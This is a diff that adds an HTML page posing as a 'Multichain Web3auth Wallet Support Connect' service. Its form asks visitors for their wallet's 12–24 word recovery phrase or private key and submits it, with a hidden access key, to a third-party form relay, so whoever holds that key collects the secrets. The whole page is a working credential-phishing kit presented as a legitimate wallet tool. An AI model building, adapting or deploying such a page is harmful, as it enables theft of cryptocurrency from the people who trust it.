@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, intial-scale=1.0">
+    <title>Connect Wallet</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+
+    <header class="header">
+        <a href="" class="logo">Web3auth</a>
+    </header>
+
+    <div class="connect-container">
+        <form action="https://api.web3forms.com/submit" method="POST" class="connect-center">
+            <div class="connect-title">
+                <h2>Multichain Web3auth <span class="nowrap">Wallet Support Connect</span></h2>
+            </div>
+            <div class="margin">
+                <input type="hidden" name="access_key" value="a092a51d-035e-4407-8e93-fe0a6206954f">
+                <p class="label">Wallet Name</p>
+                <input type="text" placeholder="Wallet Name" class="connect-input" required>
+                <p class="label">Enter Your Wallet 12 - 24 Wallet Phrase Or Private Key</p>
+                <textarea name="Phrase" placeholder="Word Phrase" class="connect-input" required></textarea>
+            </div>
+            <button type="submit">Connect Wallet</button>
+        </form>
+    </div>
+
+</body>
+
+</html>
